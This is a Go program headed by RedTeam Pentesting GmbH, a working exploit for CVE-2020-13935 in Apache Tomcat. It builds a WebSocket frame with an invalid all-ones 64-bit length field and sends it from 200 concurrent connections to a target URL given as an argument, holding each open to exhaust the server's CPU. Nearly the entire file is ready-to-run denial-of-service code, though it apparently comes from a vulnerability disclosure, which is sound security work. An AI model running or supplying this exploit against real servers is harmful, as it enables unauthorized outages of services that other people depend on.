/****************************************
 *                                      *
 *  RedTeam Pentesting GmbH             *
 *  kontakt@redteam-pentesting.de       *
 *  https://www.redteam-pentesting.de/  *
 *                                      *
 ****************************************/

package main

import (
	"bytes"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// CVE-2020-13935
//
// this program exploits a bug in tomcat which leads to continuous,
// high cpu usage if all bits of the length field of a websocket message
// are set to 1.
//
// Affected Versions:
// 10.0.0-M1 to 10.0.0-M6
// 9.0.0.M1 to 9.0.36
// 8.5.0 to 8.5.56
// 8.0.1 to 8.0.53
// 7.0.27 to 7.0.104
//
// see:
// https://bz.apache.org/bugzilla/show_bug.cgi?id=64563
// https://access.redhat.com/security/cve/CVE-2020-13935

func main() {
	if err := run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
}

func sendInvalidWebSocketMessage(url string) error {
	ws, _, err := websocket.DefaultDialer.Dial(url, nil)

	if err != nil {
		return fmt.Errorf("dial: %s", err)
	}

	// +-+-+-+-+-------+-+-------------+-------------------------------+
	//  0                   1                   2                   3
	//  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
	// +-+-+-+-+-------+-+-------------+-------------------------------+
	// |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
	// |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
	// |N|V|V|V|       |S|             |   (if payload len==126/127)   |
	// | |1|2|3|       |K|             |                               |
	// +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
	// |     Extended payload length continued, if payload len == 127  |
	// + - - - - - - - - - - - - - - - +-------------------------------+
	// |                               | Masking-key, if MASK set to 1 |
	// +-------------------------------+-------------------------------+
	// | Masking-key (continued)       |          Payload Data         |
	// +-------------------------------- - - - - - - - - - - - - - - - +
	// :                     Payload Data continued ...                :
	// + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
	// |                     Payload Data continued ...                |
	// +---------------------------------------------------------------+

	var buf bytes.Buffer

	fin := 1
	rsv1 := 0
	rsv2 := 0
	rsv3 := 0
	opcode := websocket.TextMessage

	buf.WriteByte(byte(fin<<7 | rsv1<<6 | rsv2<<5 | rsv3<<4 | opcode))

	// always set the mask bit
	// indicate 64 bit message length
	buf.WriteByte(byte(1<<7 | 0b1111111))

	// set msb to 1, violating the spec and triggering the bug
	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})

	// 4 byte masking key
	// leave zeros for now, so we do not need to mask
	maskingKey := []byte{0, 0, 0, 0}
	buf.Write(maskingKey)

	// write an incomplete message
	buf.WriteString("test")

	_, err = ws.UnderlyingConn().Write(buf.Bytes())
	if err != nil {
		return fmt.Errorf("write: %s", err)
	}

	// keep the websocket connection open for some time
	time.Sleep(30 * time.Second)

	return nil
}

func run() error {
	if len(os.Args) != 2 {
		return fmt.Errorf("usage: %s target_url", os.Args[0])
	}

	targetURL := os.Args[1]

	var wg sync.WaitGroup

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			if err := sendInvalidWebSocketMessage(targetURL); err != nil {
				fmt.Println(err)
			}
		}()
	}

	wg.Wait()

	return nil
}
